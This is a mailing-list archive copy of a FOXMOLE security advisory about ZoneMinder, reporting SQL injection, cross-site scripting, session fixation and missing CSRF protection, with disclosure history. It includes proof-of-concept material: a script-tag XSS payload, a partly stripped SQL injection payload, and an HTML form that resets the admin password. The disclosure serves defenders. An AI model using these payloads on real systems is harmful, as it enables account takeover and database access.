  oss-security - [FOXMOLE SA ZoneMinder - Multiple Issues            Products  Openwall GNU/*/Linux   server OS Linux Kernel Runtime Guard John the Ripper   password cracker  Free & Open Source for any platform in the cloud Pro for Linux Pro for macOS  Wordlists   for password cracking passwdqc   policy enforcement  Free & Open Source for Unix Pro for Windows (Active Directory)  yescrypt   KDF & password hashing yespower   Proof-of-Work (PoW) crypt_blowfish   password hashing phpass   ditto in PHP tcb   better password shadowing Pluggable Authentication Modules scanlogd   port scan detector popa3d   tiny POP3 daemon blists   web interface to mailing lists msulogin   single user mode login php_mt_seed   mt_rand() cracker  Services Publications  Articles Presentations  Resources  Mailing lists Community wiki Source code repositories (GitHub) Source code repositories (CVSweb) File archive & mirrors How to verify digital signatures OVE IDs  What's new         Follow @Openwall on Twitter for new release announcements and other news   [<prev] [next>] [thread-next>] [day] [month] [year] [list]  Date: Thu, 2 Feb From: FOXMOLE Advisories <advisories@...mole.com> To: fulldisclosure@...lists.org, bugtraq@...urityfocus.com,  bugs@...uritytracker.com, submissions@...ketstormsecurity.org,  oss-security@...ts.openwall.com Subject: [FOXMOLE SA ZoneMinder - Multiple Issues  -----BEGIN PGP SIGNED MESSAGE----- Hash:  === FOXMOLE - Security Advisory ===  Zoneminder multiple vulnerabilities ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~  Affected Versions ================= Zoneminder  Issue Overview ============== Vulnerability Type: SQL Injection, Cross Site Scripting, Session Fixation, No CSRF Protection Technical Risk: high Likelihood of Exploitation: medium Vendor: Zoneminder Vendor URL: https://zoneminder.com/ Credits: FOXMOLE employee Tim Herres Advisory URL: Advisory Status: Public CVE-Number: NA CVE URL: NA OVE-ID: OVI-ID: CWE-ID: CWE-89 CVSS 2.0: 4.3 (AV:N/AC:M/Au:N/C:P/I:N/A:N)   Impact ====== During an internal code review multiple vulnerabilities were identified. The whole application misses input validation and output encoding. This means user supplied input is inserted in an unsafe way. This could allow a remote attacker to easily compromise user accounts or access the database in an unsafe way.  Issue Description ================= The following findings are only examples there are quite more. The whole application should be reviewed.  All items tested using Firefox  1)Cross Site Scripting (XSS) Reflected: Reflected without authentication: Stored: Creating a new monitor using the name "Bla<script>alert(1)</script>". There is only a clientside protection.  2)SQL Injection Example Parameter: limit (POST)     Type: stacked queries     Title: MySQL > stacked queries (SELECT - comment)     Payload: * FROM Easy exploitable using sqlmap.  3)Session Fixation After a successful authentication the Session Cookie ZMSESSID remains the same. Example: Cookie before the login = after successful login  4)No CSRF Proctection A possible CSRF attack form, which changes the password of the admin (uid=1), if the corresponding user activates it. <html>   <body>     <form method="POST">       <input type="hidden" name="view" value="user" />       <input type="hidden" name="action" value="user" />       <input type="hidden" name="uid" value="1" />       <input type="hidden" value="" />       <input type="hidden" value="admin" />       <input type="hidden" value="admin1" />       <input type="hidden" name="conf&#95;password" value="admin1" />       <input type="hidden" value="" />       <input type="hidden" value="1" />       <input type="hidden" value="View" />       <input type="hidden" value="Edit" />       <input type="hidden" value="Edit" />       <input type="hidden" value="Edit" />       <input type="hidden" value="Edit" />       <input type="hidden" value="Edit" />       <input type="hidden" value="" />       <input type="submit" value="Submit request" />     </form>   </body> </html>    Temporary Workaround and Fix ============================ FOXMOLE advises to disable Zoneminder until the vendor publishes a complete fix.    History =======  Issue discovered  Vendor contacted, no response  Vendor contacted again, still no response  Vendor contacted --> working on a patch  Vendor contacted, asked for an update and             declare advisory release to --> no response  Advisory Release   GPG Signature ============= This advisory is signed with the GPG key of the FOXMOLE advisories team. The key can be downloaded here:  -----BEGIN PGP SIGNATURE-----  =/QtX -----END PGP SIGNATURE-----  Powered by blists - more mailing lists  Please check out the  Open Source Software Security Wiki, which is counterpart to this mailing list.  Confused about mailing lists and their use? Read about mailing lists on Wikipedia and check out these guidelines on proper formatting of your messages.      